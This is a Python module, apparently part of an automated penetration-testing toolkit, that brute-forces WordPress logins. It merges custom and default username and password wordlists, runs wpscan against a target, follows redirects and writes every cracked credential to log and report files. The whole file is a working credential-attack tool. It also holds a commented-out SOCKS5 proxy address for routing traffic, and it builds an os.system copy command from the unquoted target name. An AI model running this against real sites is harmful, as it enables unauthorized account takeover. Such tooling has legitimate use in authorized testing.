import os
import sys
import subprocess
import tempfile
import re
from modules.http_detect_scheme import get_scheme

def run_wpscan_attack_file(target, usernames_file, passwords_file, success_file):
    command = [
        "wpscan",
        "--url", target,
        "--usernames", usernames_file,
        "--passwords", passwords_file,
        "--no-banner",
        # "--proxy", "socks5://35.180.42.196:1080",
        "--update"
    ]
    result = subprocess.run(command, capture_output=True, text=True)
    output = result.stdout + "\n" + result.stderr

    if "Scan Aborted" in output and "redirects to" in output:
        print("[*] Analyzing output to extract the new URL...")
        match = re.search(r"redirects to:?\s*(\S+)", output, re.IGNORECASE)
        if match:
            new_url = match.group(1).rstrip('/.')
            print(f"[+] New URL detected: {new_url}. Re-running on the new URL...")
            return run_wpscan_attack_file(new_url, usernames_file, passwords_file, success_file)
        else:
            print("[!] Could not extract the new URL to re-run WPScan.")
            return 0

    # Look for all occurrences of success in the format: [SUCCESS] - username / password
    success_matches = re.findall(r'\[SUCCESS\]\s*-\s*(\S+)\s*/\s*(\S+)', output)
    if success_matches:
        for username, password in success_matches:
            print(f"[+] Valid credentials found: {username}:{password}")
            with open(success_file, "a", encoding="utf-8") as sf:
                sf.write(f"Valid credentials found in WordPress: {username}:{password}\n")
        return len(success_matches)
    else:
        return 0

def wordpress_bruteforce(target):
    scheme = get_scheme(target) + "://"
    target = scheme + target
    target_clean = target.replace("http://", "").replace("https://", "").rstrip("/")

    # Directory to save logs and results
    output_dir = os.path.join("logs", target_clean, "http", "wordpress")
    os.makedirs(output_dir, exist_ok=True)
    success_file = os.path.join(output_dir, "credentials.txt")
    # Clear previous success file (if it exists)
    with open(success_file, "w", encoding="utf-8") as sf:
        sf.write("")

    # Use two sets to accumulate users and passwords without duplicates
    accumulated_users = set()
    accumulated_passwords = set()

    # --- 1. Scenario: Custom Lists ---
    custom_dir = os.path.join("wordlists", target_clean)
    users_custom = []
    pass_custom = []
    user_file = os.path.join(custom_dir, "users.txt")
    pass_file = os.path.join(custom_dir, "passwords.txt")
    if os.path.isdir(custom_dir):
        if os.path.isfile(user_file):
            try:
                with open(user_file, "r", encoding="utf-8") as f:
                    users_custom = [line.strip() for line in f if line.strip()]
                print(f"[+] Loaded {len(users_custom)} custom users from {user_file}")
            except Exception as e:
                print(f"[!] Error reading {user_file}: {e}")
        if os.path.isfile(pass_file):
            try:
                with open(pass_file, "r", encoding="utf-8") as f:
                    pass_custom = [line.strip() for line in f if line.strip()]
                print(f"[+] Loaded {len(pass_custom)} custom passwords from {pass_file}")
            except Exception as e:
                print(f"[!] Error reading {pass_file}: {e}")

    # If custom users exist, add them to the accumulated users set
    if users_custom:
        accumulated_users.update(users_custom)
        # For testing the user:user scenario, also add them to the passwords set
        accumulated_passwords.update(users_custom)
        # Additionally, if custom users exist, try to complement with the default password list
        default_pass_file = os.path.join("wordlists", "misc", "top_wordpress_passwords.txt")
        if os.path.isfile(default_pass_file):
            try:
                with open(default_pass_file, "r", encoding="utf-8") as f:
                    default_passwords = [line.strip() for line in f if line.strip()]
                print(f"[+] Loaded {len(default_passwords)} default passwords from {default_pass_file}")
                accumulated_passwords.update(default_passwords)
            except Exception as e:
                print(f"[!] Error reading {default_pass_file}: {e}")
        else:
            print(f"[!] Default list not found: {default_pass_file}")

    # If custom passwords exist, add them to the accumulated passwords set
    if pass_custom:
        accumulated_passwords.update(pass_custom)

    # --- 2. Scenario: Default Combined List ---
    default_combo_file = os.path.join("wordlists", "misc", "common_credentials.txt")
    if os.path.isfile(default_combo_file):
        try:
            with open(default_combo_file, "r", encoding="utf-8") as f:
                combos = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(combos)} combos from {default_combo_file}")
        except Exception as e:
            print(f"[!] Error reading {default_combo_file}: {e}")
            combos = []
        if combos:
            for combo in combos:
                if ":" in combo:
                    u, p = combo.split(":", 1)
                    accumulated_users.add(u.strip())
                    accumulated_passwords.add(p.strip())
        else:
            print("[!] The combined list is empty.")
    else:
        print(f"[!] Combined credentials list not found: {default_combo_file}")

    # Convert sets to lists to write to temporary files
    final_users = list(accumulated_users)
    final_passwords = list(accumulated_passwords)

    # Verify that there is data to attack with
    if final_users and final_passwords:
        with tempfile.NamedTemporaryFile(mode="w", delete=False, encoding="utf-8") as tmp_users:
            for user in final_users:
                tmp_users.write(user + "\n")
            tmp_users_file = tmp_users.name

        with tempfile.NamedTemporaryFile(mode="w", delete=False, encoding="utf-8") as tmp_pass:
            for pwd in final_passwords:
                tmp_pass.write(pwd + "\n")
            tmp_pass_file = tmp_pass.name

        print("[*] Running attack with the combined lists...")
        total_found = run_wpscan_attack_file(target, tmp_users_file, tmp_pass_file, success_file)

        # Remove the temporary files
        os.remove(tmp_users_file)
        os.remove(tmp_pass_file)
    else:
        print("[-] No credentials lists available to run WPScan attack.")
        total_found = 0

    if total_found > 0:
        print(f"[+] Bruteforce completed. A total of {total_found} valid credential(s) were found.")
        # Copy the success file to logs/<target>/report/wordpress_credentials.txt
        report_dir = os.path.join("logs", target_clean, "report")
        os.makedirs(report_dir, exist_ok=True)
        report_file = os.path.join(report_dir, "wordpress_credentials.txt")
        os.system(f"cp {success_file} {report_file}")
    else:
        print("[+] Bruteforce completed without finding valid credentials.")
        with open(success_file, "w", encoding="utf-8") as sf:
            sf.write("No valid credentials were found in WordPress.")

def run_http_wordpress_bruteforce(target):
    print("[*] Running WordPress bruteforce module...")
    wordpress_bruteforce(target)
    print("[+] WordPress bruteforce module completed.")

if __name__ == "__main__":
    target = sys.argv[1]
    run_http_wordpress_bruteforce(target)
